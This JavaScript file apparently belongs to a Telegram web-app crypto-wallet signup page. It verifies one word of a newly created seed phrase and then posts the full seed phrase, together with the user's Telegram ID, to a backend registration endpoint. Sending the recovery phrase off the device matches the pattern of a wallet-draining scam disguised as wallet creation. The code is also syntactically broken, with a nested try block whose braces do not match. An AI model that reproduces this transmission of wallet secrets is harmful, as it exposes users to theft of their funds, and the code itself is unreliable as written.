document.addEventListener('DOMContentLoaded', () => {
    const verifyBtn = document.querySelector('[data-js-verify-button]');
    const verifyInput = document.querySelector('[data-js-verify-input]');

    verifyBtn.addEventListener('click', async () => {
        // 1. Получаем фразу из sessionStorage
        const savedPhrase = sessionStorage.getItem('seedPhrase');
        if (!savedPhrase) {
            alert('Ошибка: фраза не найдена. Попробуйте создать кошелек заново.');
            window.location.href = 'create.html';
            return;
        }

        const phraseArray = JSON.parse(savedPhrase);
        const userWord = verifyInput.value.trim().toLowerCase();
        const correctWord = phraseArray[5]; // 6-е слово имеет индекс 5

        // 2. Проверка
        if (userWord !== correctWord) {
            alert('Incorrect word. Please try again.');
            return;
        }
        let userId = null;
        // 3. Если всё верно — регистрируем
        try {
            // Добавляем состояние загрузки (если нужно)
            verifyBtn.textContent = 'Verifying...';
            verifyBtn.disabled = true;
            try {
                const tg = window.Telegram.WebApp;
                if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
                    userId = tg.initDataUnsafe.user.id;
                } else {
                    console.warn("Приложение открыто не в Telegram");
                    // Тут можно добавить логику для "обычных" браузеров
                }
            const response = await fetch(`${API_BASE_URL}/user/register`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phrase: phraseArray.join(' '),tg_user_id: userId }),
            });

            if (response.ok) {
                window.location.href = 'created.html';
            } else {
                alert('Ошибка при регистрации на сервере.');
            }
        } catch (err) {
            console.error('Registration failed:', err);
            alert('Ошибка соединения с сервером.');
        } finally {
            verifyBtn.textContent = 'Verify';
            verifyBtn.disabled = false;
        }
    });
});